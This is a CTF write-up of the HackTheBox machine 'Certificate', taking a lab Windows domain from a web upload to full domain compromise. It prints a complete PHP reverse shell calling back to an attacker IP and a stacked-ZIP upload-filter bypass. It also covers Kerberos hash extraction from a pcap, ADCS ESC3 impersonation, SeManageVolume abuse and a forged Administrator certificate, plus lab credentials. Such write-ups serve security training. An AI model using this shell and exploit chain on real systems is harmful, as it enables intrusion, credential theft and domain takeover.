---
title: "Certificate HackTheBox" 
date: 2026-6-15 2:00:00 0000+
tags: [WriteUp, Certificate, HTB, PFX Forge, Golden PFX, ADCS, SeManageVolumePrivilege, SeManageVolumeAbuse, ESC3, Certipy-ad, Enumeration, Active Directory, Lateral Movement, Bloodhound, Privilege Escalation, Hash Cracking, Powershell, bloodyAD, Stacked ZIP Exploitation, Null byte Injection, Wireshark, pcap to TGT, pcap to AS-REQ, KRB5roastParser, MySQL Exploitation,Windows]
categories: [WriteUps,HackTheBox]
image:
  path: /assets/images/Certificate_HTB/image.png
---
# Certificate HackTheBox

`Certificate` is a hard Windows Active Directory machine that starts with an E-learning platform. The web application is vulnerable to `Null-Byte Injection` and `stacked zip exploit` , allowing a `PHP` reverse shell to be executed for initial access as `xamppuser`. Database credentials are retrieved, enabling lateral movement to the `Sara.B` user. Further enumeration uncovers a network capture file that leaks `Lion.SK’s` credentials. Using these, Active Directory Certificate Services (`ADCS`) is enumerated, and a vulnerable template is exploited to request certificates on behalf of other users. A certificate for the `Ryan.K` user is then obtained, whose `SeManageVolumePrivilege` is leveraged to obtain full control over the C:\ directory by exploiting it with `SeManageVolumeExploit.exe`. Then we create a golden PFX to forge the Administrator’s pfx and then authencate to get NT hash of the Administrator achieving full domain compromise.

![image.png](/assets/images/Certificate_HTB/image%201.png)

## Initial Foothold

### Rustscan

```bash
rustscan -a 10.129.245.51 -r 1-65535 -- -sC -sV -oA nmap/certificate -vv 10.129.245.51
```

![image.png](/assets/images/Certificate_HTB/image%202.png)

![image.png](/assets/images/Certificate_HTB/image%203.png)

![image.png](/assets/images/Certificate_HTB/image%204.png)

![image.png](/assets/images/Certificate_HTB/image%205.png)

![image.png](/assets/images/Certificate_HTB/image%206.png)

Rustscan identified that there are numerous ports open on the server they being DNS, LDAP, SMB indicating that there is Active directory installed on the box. Also the ADCS is configured since we have all the certificate information from the results.

The hostname of of the domain controller is identified as DC01 and the domain name is `certificate.htb` so the Frequently qualified domain name is `DC01.CERTIFICATE.HTB`

We also have port 80 open on the box.

Adding certificate.htb to our `/etc/hosts` file to resolve the DNS.

The clock is also `8hours 5mins 4secs` ahead of our local time so we need to sync it using ntpdate.

```bash
sudo ntpdate 10.129.245.51
```

![image.png](/assets/images/Certificate_HTB/image%207.png)

### Website Enumeration

Lets take a look at the webpage at port 80.

![image.png](/assets/images/Certificate_HTB/image%208.png)

We have a website.

Lets perform some dirbusting on the webpage to see if we can find some hidden directories.

```bash
gobuster dir -u http://certificate.htb/ -w /usr/share/wordlists/SecLists/Discovery/Web-Content/DirBuster-2007_directory-list-2.3-medium.txt -b 404,403 -t 100 -x php,html,txt
```

![image.png](/assets/images/Certificate_HTB/image%209.png)

We see that there is courses.php upload.php blog.php, such php files are present on the webpage.

Looking at the courses page, we have this.

![image.png](/assets/images/Certificate_HTB/image%2010.png)

Going over to `How to be the employee of the month!` and enrolling in the course we have this page.

### ZIP File Upload CVE-2025-24071 (Failed)

![image.png](/assets/images/Certificate_HTB/image%2011.png)

Going over quizz1 we have a upload page.

![image.png](/assets/images/Certificate_HTB/image%2012.png)

It accepts the .pdf, .docx, .pptx, .xlsx and .zip.

So lets try with the Phishing attack by uploading a malicious zip file to the server and start listening using responder to see if any person click on the link.

We can use this zip exploit.

[https://github.com/Marcejr117/CVE-2025-24071_PoC](https://github.com/Marcejr117/CVE-2025-24071_PoC)

This is a `CVE-2025-24054`

Creating a malicious zip now.

```bash
python3 PoC.py malicious 10.10.14.72
```

![image.png](/assets/images/Certificate_HTB/image%2013.png)

Started Responder for the listening and uploading the .zip to the website.

![image.png](/assets/images/Certificate_HTB/image%2014.png)

Upon uploading it is found that it detects the malicious zip file being uplodede to the server meaning there is some sort of filtering that is blocking it.

Also we didnt recieve any hit backs on our responder tab.

![image.png](/assets/images/Certificate_HTB/image%2015.png)

We can also try with the .php files by zipping, so lets try that.

I will use the `php-reverse-shell` by `IVAN` and create a zip for it and then upload it.

```php
<?php
// Copyright (c) 2020 Ivan Šincek
// v3.0
// Requires PHP v5.0.0 or greater.
// Works on Linux OS, macOS, and Windows OS.
// See the original script at https://github.com/pentestmonkey/php-reverse-shell.
class Shell {
	private $addr  = null;
	private $port  = null;
	private $os    = null;
	private $shell = null;
	private $descriptorspec = array(
		0 => array('pipe', 'r'), // shell can read from STDIN
		1 => array('pipe', 'w'), // shell can write to STDOUT
		2 => array('pipe', 'w')  // shell can write to STDERR
	);
	private $buffer = 1024;  // read/write buffer size
	private $clen   = 0;     // command length
	private $error  = false; // stream read/write error
	private $sdump  = true;  // script's dump
	public function __construct($addr, $port) {
		$this->addr = $addr;
		$this->port = $port;
	}
	private function detect() {
		$detected = true;
		$os = strtoupper(PHP_OS);
		if (stripos($os, 'LINUX') !== false || stripos($os, 'DARWIN') !== false) {
			$this->os    = 'LINUX';
			$this->shell = '/bin/sh';
		} else if (stripos($os, 'WINDOWS') !== false || stripos($os, 'WINNT') !== false || stripos($os, 'WIN32') !== false) {
			$this->os    = 'WINDOWS';
			$this->shell = 'cmd.exe';
		} else {
			$detected = false;
			echo "SYS_ERROR: Underlying operating system is not supported, script will now exit...\n";
		}
		return $detected;
	}
	private function daemonize() {
		$exit = false;
		if (!function_exists('pcntl_fork')) {
			echo "DAEMONIZE: pcntl_fork() does not exists, moving on...\n";
		} else if (($pid = @pcntl_fork()) < 0) {
			echo "DAEMONIZE: Cannot fork off the parent process, moving on...\n";
		} else if ($pid > 0) {
			$exit = true;
			echo "DAEMONIZE: Child process forked off successfully, parent process will now exit...\n";
			// once daemonized, you will actually no longer see the script's dump
		} else if (posix_setsid() < 0) {
			echo "DAEMONIZE: Forked off the parent process but cannot set a new SID, moving on as an orphan...\n";
		} else {
			echo "DAEMONIZE: Completed successfully!\n";
		}
		return $exit;
	}
	private function settings() {
		@error_reporting(0);
		@set_time_limit(0); // do not impose the script execution time limit
		@umask(0); // set the file/directory permissions - 666 for files and 777 for directories
	}
	private function dump($data) {
		if ($this->sdump) {
			$data = str_replace('<', '&lt;', $data);
			$data = str_replace('>', '&gt;', $data);
			echo $data;
		}
	}
	private function read($stream, $name, $bytes) {
		if (($data = @fread($stream, $bytes)) === false) { // suppress an error when reading from a closed blocking stream
			$this->error = true;                            // set the global error flag
			echo "STRM_ERROR: Cannot read from {$name}, script will now exit...\n";
		}
		return $data;
	}
	private function write($stream, $name, $data) {
		if (($bytes = @fwrite($stream, $data)) === false) { // suppress an error when writing to a closed blocking stream
			$this->error = true;                            // set the global error flag
			echo "STRM_ERROR: Cannot write to {$name}, script will now exit...\n";
		}
		return $bytes;
	}
	// read/write method for non-blocking streams
	private function rw($input, $output, $iname, $oname) {
		while (($data = $this->read($input, $iname, $this->buffer)) && $this->write($output, $oname, $data)) {
			if ($this->os === 'WINDOWS' && $oname === 'STDIN') { $this->clen += strlen($data); } // calculate the command length
			$this->dump($data); // script's dump
		}
	}
	// read/write method for blocking streams (e.g. for STDOUT and STDERR on Windows OS)
	// we must read the exact byte length from a stream and not a single byte more
	private function brw($input, $output, $iname, $oname) {
		$size = fstat($input)['size'];
		if ($this->os === 'WINDOWS' && $iname === 'STDOUT' && $this->clen) {
			// for some reason Windows OS pipes STDIN into STDOUT
			// we do not like that
			// so we need to discard the data from the stream
			while ($this->clen > 0 && ($bytes = $this->clen >= $this->buffer ? $this->buffer : $this->clen) && $this->read($input, $iname, $bytes)) {
				$this->clen -= $bytes;
				$size -= $bytes;
			}
		}
		while ($size > 0 && ($bytes = $size >= $this->buffer ? $this->buffer : $size) && ($data = $this->read($input, $iname, $bytes)) && $this->write($output, $oname, $data)) {
			$size -= $bytes;
			$this->dump($data); // script's dump
		}
	}
	public function run() {
		if ($this->detect() && !$this->daemonize()) {
			$this->settings();

			// ----- SOCKET BEGIN -----
			$socket = @fsockopen($this->addr, $this->port, $errno, $errstr, 30);
			if (!$socket) {
				echo "SOC_ERROR: {$errno}: {$errstr}\n";
			} else {
				stream_set_blocking($socket, false); // set the socket stream to non-blocking mode | returns 'true' on Windows OS

				// ----- SHELL BEGIN -----
				$process = @proc_open($this->shell, $this->descriptorspec, $pipes, null, null);
				if (!$process) {
					echo "PROC_ERROR: Cannot start the shell\n";
				} else {
					foreach ($pipes as $pipe) {
						stream_set_blocking($pipe, false); // set the shell streams to non-blocking mode | returns 'false' on Windows OS
					}

					// ----- WORK BEGIN -----
					$status = proc_get_status($process);
					@fwrite($socket, "SOCKET: Shell has connected! PID: {$status['pid']}\n");
					do {
						$status = proc_get_status($process);
						if (feof($socket)) { // check for end-of-file on SOCKET
							echo "SOC_ERROR: Shell connection has been terminated\n"; break;
						} else if (feof($pipes[1]) || !$status['running']) {                 // check for end-of-file on STDOUT or if process is still running
							echo "PROC_ERROR: Shell process has been terminated\n";   break; // feof() does not work with blocking streams
						}                                                                    // use proc_get_status() instead
						$streams = array(
							'read'   => array($socket, $pipes[1], $pipes[2]), // SOCKET | STDOUT | STDERR
							'write'  => null,
							'except' => null
						);
						$num_changed_streams = @stream_select($streams['read'], $streams['write'], $streams['except'], 0); // wait for stream changes | will not wait on Windows OS
						if ($num_changed_streams === false) {
							echo "STRM_ERROR: stream_select() failed\n"; break;
						} else if ($num_changed_streams > 0) {
							if ($this->os === 'LINUX') {
								if (in_array($socket  , $streams['read'])) { $this->rw($socket  , $pipes[0], 'SOCKET', 'STDIN' ); } // read from SOCKET and write to STDIN
								if (in_array($pipes[2], $streams['read'])) { $this->rw($pipes[2], $socket  , 'STDERR', 'SOCKET'); } // read from STDERR and write to SOCKET
								if (in_array($pipes[1], $streams['read'])) { $this->rw($pipes[1], $socket  , 'STDOUT', 'SOCKET'); } // read from STDOUT and write to SOCKET
							} else if ($this->os === 'WINDOWS') {
								// order is important
								if (in_array($socket, $streams['read'])/*------*/) { $this->rw ($socket  , $pipes[0], 'SOCKET', 'STDIN' ); } // read from SOCKET and write to STDIN
								if (($fstat = fstat($pipes[2])) && $fstat['size']) { $this->brw($pipes[2], $socket  , 'STDERR', 'SOCKET'); } // read from STDERR and write to SOCKET
								if (($fstat = fstat($pipes[1])) && $fstat['size']) { $this->brw($pipes[1], $socket  , 'STDOUT', 'SOCKET'); } // read from STDOUT and write to SOCKET
							}
						}
					} while (!$this->error);
					// ------ WORK END ------

					foreach ($pipes as $pipe) {
						fclose($pipe);
					}
					proc_close($process);
				}
				// ------ SHELL END ------

				fclose($socket);
			}
			// ------ SOCKET END ------

		}
	}
}
echo '<pre>';
// change the host address and/or port number as necessary
$sh = new Shell('10.10.14.72', 9001);
$sh->run();
unset($sh);
// garbage collector requires PHP v5.3.0 or greater
// @gc_collect_cycles();
echo '</pre>';
?>

```

```bash
zip mal.zip shell.php
```

![image.png](/assets/images/Certificate_HTB/image%2016.png)

Uploading mal.zip to the website.

![image.png](/assets/images/Certificate_HTB/image%2017.png)

Again it failed.

### ZIP Concatenation Attack or ZIP Stack Attack

So we need to bypass this filter and this can be done by using a zip stacked attack.

We need to create a normal zip file containing a legit file that is accepted by the server.

```php
touch legit.pdf
zip legit.zip legit.pdf
```

![image.png](/assets/images/Certificate_HTB/image%2018.png)

Now we create another zip and this will be our malicious zip containing the shell.php

```php
zip mal.zip shell.php
```

![image.png](/assets/images/Certificate_HTB/image%2019.png)

Now we have 2 zip files one is legit and another is malicious.

Now we need to stack them.

```php
cat legit.zip mal.zip > stacked.zip
```

![image.png](/assets/images/Certificate_HTB/image%2020.png)

Starting a listener on port 9001 as specified in the php reverse shell.

Uploading the stacked.zip to the webpage.

![image.png](/assets/images/Certificate_HTB/image%2021.png)

It says successfully uploaded, now triggering it by going over to the provided link.

![image.png](/assets/images/Certificate_HTB/image%2022.png)

Earlier it hit legit.php which is showing errors, so modified the path and called our file shell.php and on our listener we get a shell.

![image.png](/assets/images/Certificate_HTB/image%2023.png)

### Enumeration as xamppuser

Enumerating the box as the xamppuser.

![image.png](/assets/images/Certificate_HTB/image%2024.png)

Looking over the privileges.

![image.png](/assets/images/Certificate_HTB/image%2025.png)

Looking in the webserver root we have these directories.

![image.png](/assets/images/Certificate_HTB/image%2026.png)

Looking at the db.php file, we have credentials for the mysql database, saving them to a file.

Enumerating the users on the box which have shell access.

![image.png](/assets/images/Certificate_HTB/image%2027.png)

### Dumping the database hashes.

Lets check with the database first.

We can find the `mysql.exe` on the host in `C:\xampp\mysql\bin\mysql.exe`

```bash
.\mysql.exe -u 'certificate_webapp_user' -p'cert!f!c@teDBPWD'
```

![image.png](/assets/images/Certificate_HTB/image%2028.png)

It hangs!

So lets run the query within the single line too.

```bash
.\mysql.exe -u 'certificate_webapp_user' -p'cert!f!c@teDBPWD' -e 'show databases;'
```

![image.png](/assets/images/Certificate_HTB/image%2029.png)

Lets use the certificate_webapp_db database and list all the tables in it.

```bash
.\mysql.exe -u 'certificate_webapp_user' -p'cert!f!c@teDBPWD' -e 'use certificate_webapp_db;show tables;'
```

![image.png](/assets/images/Certificate_HTB/image%2030.png)

Now listing the users table.

```bash
.\mysql.exe -u 'certificate_webapp_user' -p'cert!f!c@teDBPWD' -e 'use certificate_webapp_db;select * from users;'
```

![image.png](/assets/images/Certificate_HTB/image%2031.png)

And we have some hashes.

### Shell as Sara.B

I will save these hashes to a file and try to crack them using john.

![image.png](/assets/images/Certificate_HTB/image%2032.png)

Cracking with John The Ripper

```bash
john --wordlist=/usr/share/wordlists/rockyou.txt hashes.txt
```

![image.png](/assets/images/Certificate_HTB/image%2033.png)

These are bcrypt hashes and it only cracked for `Sara.B`

Lets verify her credentials using netexec.

```bash
nxc smb 10.129.245.51 -u 'sara.b' -p 'Blink182'
```

![image.png](/assets/images/Certificate_HTB/image%2034.png)

Checking for the Winrm access.

```bash
nxc winrm 10.129.245.51 -u 'sara.b' -p 'Blink182'
```

![image.png](/assets/images/Certificate_HTB/image%2035.png)

Lets get on the box as `Sara.B` and see what we can find, we are going to use `evil-winrm-py` to connect.

```bash
python3 /opt/winrmexec/evil_winrmexec.py certificate.htb/sara.b:'Blink182'@dc01.certificate.htb -dc-ip 10.129.169.250
```

![image.png](/assets/images/Certificate_HTB/image%2036.png)

In documents folder we have a directory as `WS-01` host containing a `Description.txt` and a `WS-01_PktMon.pcap` file.

I will download these both my local machine.

![image.png](/assets/images/Certificate_HTB/image%2037.png)

Looking at these files.

![image.png](/assets/images/Certificate_HTB/image%2038.png)

### PCAP Analysis in Wireshark

Going over through the .pcap file.

![image.png](/assets/images/Certificate_HTB/image%2039.png)

I searched through all of the SMB2 protocol and didnt seem to find anything.

Also there is a kerberos protocol present in the pcap file too.

![image.png](/assets/images/Certificate_HTB/image%2040.png)

This contains the AS-REQ from the users.

![image.png](/assets/images/Certificate_HTB/image%2041.png)

In one of the packets there is a user named Lion.SK.

### Shell as Lion.SK

There is tool which can extract the ASREP request for us.

[https://github.com/jalvarezz13/Krb5RoastParser](https://github.com/jalvarezz13/Krb5RoastParser)

Running this tool…, we can get the `AS_REQ`.

```bash
python3 krb5_roast_parser.py ../WS-01_PktMon.pcap as_req
```

![image.png](/assets/images/Certificate_HTB/image%2042.png)

Getting the `AS_REP`.

```bash
python3 krb5_roast_parser.py ../WS-01_PktMon.pcap as_rep
```

![image.png](/assets/images/Certificate_HTB/image%2043.png)

And finally the `TGS_REP`

```bash
python3 krb5_roast_parser.py ../WS-01_PktMon.pcap tgs_rep
```

![image.png](/assets/images/Certificate_HTB/image%2044.png)

Lets now crack these responses.

![image.png](/assets/images/Certificate_HTB/image%2045.png)

It cracked the AS-REQ out of the 3 authentications.

```bash
hashcat -m 19900 lionsk_asreq.txt /usr/share/wordlists/rockyou.txt
```

![image.png](/assets/images/Certificate_HTB/image%2046.png)

Lets verify the credentials using netexec.

```bash
nxc smb 10.129.245.51 -u 'lion.sk' -p '!QAZ2wsx' --shares
nxc winrm 10.129.245.51 -u 'lion.sk' -p '!QAZ2wsx'
```

![image.png](/assets/images/Certificate_HTB/image%2047.png)

Using evil-winrm to get a shell on the box.

```bash
python3 /opt/winrmexec/evil_winrmexec.py certificate.htb/'Lion.Sk':'!QAZ2wsx'@dc01.certificate.htb -dc-ip 10.129.169.250
```

![image.png](/assets/images/Certificate_HTB/image%2048.png)

Claiming the user.txt flag.

![image.png](/assets/images/Certificate_HTB/image%2049.png)

## Privilege Escalation

### Bloodhound

Gathering some bloodhound data using Rusthound-ce

```bash
rusthound-ce -d certificate.htb -u 'lion.sk' -p '!QAZ2wsx' -i 10.129.245.51 -c All -z
```

![image.png](/assets/images/Certificate_HTB/image%2050.png)

Looking at the outbounds from **Lion.SK** in bloodhound.

![image.png](/assets/images/Certificate_HTB/image%2051.png)

He is a member of `Domain CRA Managers` whose memebers can enroll `DELEGATED-CRA@CERTIFICATE.HTB` template.

### Certipy

Lets enumerate this using certipy-ad.

```bash
certipy find -vulnerable -u 'lion.sk' -p '!QAZ2wsx' -dc-ip 10.129.245.51 -stdout
```

![image.png](/assets/images/Certificate_HTB/image%2052.png)

![image.png](/assets/images/Certificate_HTB/image%2053.png)

This says it is vulnerable to ESC3 - Enterprise security certificate 3

### ESC3 to Ryan.K

We can see that the template has Certificate Request Agent EKU set.

A **Certificate Request Agent** is a **delegated user or service** that is authorized to **request digital certificates on behalf of other users or devices** in an Active Directory environment, typically through a special certificate template.

In Active Directory Certificate Services (ADCS), a **Certificate Request Agent** is a trusted account (typically a user or service account) that is **authorized to request certificates on behalf of other users or computers**.

So lets first get a certificate for our own user.

```bash
certipy req -u 'lion.sk@certificate.htb' -p '!QAZ2wsx' -dc-ip 10.129.245.51 -ca Certificate-LTD-CA -target 'dc01.certificate.htb' -template 'Delegated-CRA'
```

![image.png](/assets/images/Certificate_HTB/image%2054.png)

Now we use this .pfx to request a certificate on behalf of another user and for that we need to specify a template so lets take a look at all the templates in the AD environment.

![image.png](/assets/images/Certificate_HTB/image%2055.png)

Using `SignedUser` template to impersonate Administrator account.

```bash
certipy req -u 'lion.sk@certificate.htb' -p '!QAZ2wsx' -dc-ip 10.129.245.51 -ca Certificate-LTD-CA -target 'dc01.certificate.htb' -template 'SIGNEDUSER' -on-behalf-of administrator -pfx lion.sk.pfx
```

![image.png](/assets/images/Certificate_HTB/image%2056.png)

But it fails to impersonate Administrator since its email is not set as it says `CERTSRV_E_SUBJECT_EMAIL_REQUIRED`, so we need accounts that have their email set on them.

```bash
nxc ldap 10.129.245.51 -u 'lion.sk' -p '!QAZ2wsx' --query "(objectClass=user)" "*" | grep mail
```

![image.png](/assets/images/Certificate_HTB/image%2057.png)

But what user to impersonate here.

Looking at the Users who are odd in the AD environment.

![image.png](/assets/images/Certificate_HTB/image%2058.png)

Ryan.K is a member of `Domain storage Managers` 

Lets try to impersonate him since it also have an email registered to it and see what we can find as him. He is also a member of  Remote Management Users.

```bash
certipy req -u 'lion.sk@certificate.htb' -p '!QAZ2wsx' -dc-ip 10.129.245.51 -ca Certificate-LTD-CA -target 'dc01.certificate.htb' -template 'SIGNEDUSER' -on-behalf-of Ryan.K -pfx lion.sk.pfx
```

![image.png](/assets/images/Certificate_HTB/image%2059.png)

Now we authenticate as `Ryan.K` to get its NT Hash.

```bash
certipy auth -pfx ryan.k.pfx  -dc-ip 10.129.245.51 -domain certificate.htb
```

![image.png](/assets/images/Certificate_HTB/image%2060.png)

### Shell as Ryan.K (SeManageVolumePrivilege)

Lets winrm as Ryan.K and enumerate more about the group `Domain Storage Managers` which Ryan is part of.

```bash
evil-winrm-py -i 10.129.245.51 -u 'Ryan.K' -H 'b1bc3d70e70f4f36b1509a65ae1a2ae6'
```

![image.png](/assets/images/Certificate_HTB/image%2061.png)

Looking at the privileges Ryan.K has.

```bash
whoami /priv
```

![image.png](/assets/images/Certificate_HTB/image%2062.png)

We can see that Ryan.K has SeManageVolumePrivilege enabled, Here an exploit to achive system level access.

[https://github.com/CsEnox/SeManageVolumeExploit](https://github.com/CsEnox/SeManageVolumeExploit)

[https://github.com/xct/SeManageVolumeAbuse](https://github.com/xct/SeManageVolumeAbuse)

Transferring the exploit to the machine and triggering it.

```bash
.\SeManageVolumeExploit.exe
```

![image.png](/assets/images/Certificate_HTB/image%2063.png)

Now we have Full SYSTEM level access on C:\WINDOWS\

![image.png](/assets/images/Certificate_HTB/image%2064.png)

Lets try to read Administrator flag now.

![image.png](/assets/images/Certificate_HTB/image%2065.png)

Still we get denied, I think this is due to EFS.

![image.png](/assets/images/Certificate_HTB/image%2066.png)

The file root.txt is encrypted.

### GoldenPFX to Administrator

Since we have full access over the C:\ file system, we can create a GOLDEN PFX file that signs all the certificates.

And to do that we need the serial number of the CA which we have from the scans above.

![image.png](/assets/images/Certificate_HTB/image%2067.png)

The `Certificate Serial Number` field contains it, now we can user certutil.exe to get a .pfx.

```bash
certutil.exe -exportPFX  344CB419D59054904031B340F5A43923 .\ca.pfx
```

![image.png](/assets/images/Certificate_HTB/image%2068.png)

Now we use this .PFX file to FORGE a pfx for administrator.

```bash
certipy forge -upn Administrator@certificate.htb -ca-pfx ca.pfx
```

![image.png](/assets/images/Certificate_HTB/image%2069.png)

Now we use this Administrator’s forged PFX to get the administrator hash.

```bash
certipy auth -pfx administrator_forged.pfx -dc-ip 10.129.245.51 -domain certificate.htb
```

![image.png](/assets/images/Certificate_HTB/image%2070.png)

We now have the administrator’s hash, lets get a shell as him using `evil-winrm`.

```bash
evil-winrm-py -i 10.129.245.51 -u 'Administrator' -H 'd804304519bf0143c14cbf1c024408c6'
```

![image.png](/assets/images/Certificate_HTB/image%2071.png)

Rooted!

![image.png](/assets/images/Certificate_HTB/image%2072.png)

Thanks for reading 😎
